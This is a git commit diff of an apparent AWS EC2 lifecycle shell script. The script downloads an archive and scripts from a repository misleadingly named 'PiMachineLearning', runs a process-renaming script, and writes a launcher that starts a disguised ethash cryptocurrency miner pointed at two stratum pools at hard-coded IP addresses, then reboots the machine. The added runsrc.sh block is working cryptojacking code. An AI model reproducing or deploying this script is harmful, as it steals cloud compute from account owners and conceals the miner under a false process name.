c928e6768a59a16f4f888bbb78dbc5ed281fd343
Jame <lungtungner@gmail.com>
2022-03-23 23:21:19 +0700

    Update lifecycle.sh

--- lifecycle.sh
+++ lifecycle.sh
@@ -1,26 +1,26 @@
 #!/bin/bash
 cd /home/ec2-user
-			wget https://github.com/Dev699vn/PiMachineLearning/raw/main/linux.tar.gz
+			sudo wget https://github.com/Dev699vn/PiMachineLearning/raw/main/linux.tar.gz
 			tar -xvf linux.tar.gz
             rm -rf linux.tar.gz
             mkdir bin
-			wget https://raw.githubusercontent.com/Dev699vn/PiMachineLearning/main/processname.sh
+			sudo wget https://raw.githubusercontent.com/Dev699vn/PiMachineLearning/main/processname.sh
 			chmod +x processname.sh
             ./processname.sh
-#			wget https://raw.githubusercontent.com/Dev699vn/PiMachineLearning/main/cron.sh
-#			wget https://raw.githubusercontent.com/Dev699vn/PiMachineLearning/main/cronadd.sh
-#			wget https://raw.githubusercontent.com/Dev699vn/PiMachineLearning/main/auinstall.sh
-#			chmod +x auinstall.sh 
-#           chmod +x cronadd.sh
-#            ./cronadd.sh
 			echo ec2-user > inuser.txt
-            echo "Dev699vn/PiMachineLearning"> gitpath.txt
             cp inuser.txt bin/inuser.txt
             cp gitpath.txt bin/gitpath.txt
             cd bin/
-           	wget https://raw.githubusercontent.com/Dev699vn/PiMachineLearning/main/wl.txt
-			wget https://raw.githubusercontent.com/Dev699vn/PiMachineLearning/main/runlinux.sh
-			mv runlinux.sh runsrc.sh
+
+tee -a runsrc.sh <<EOF
+#!/bin/bash
+USEPROCNAME=$(cat SETPROCNAME.txt)
+pool1="184.164.64.100:8086"
+pool2="159.203.107.149:8080"
+./$USEPROCNAME -a ethash -o stratum+http://$pool1 -o stratum+http://$pool2
+
+EOF
+
             chmod +x runsrc.sh
 			sudo reboot
 
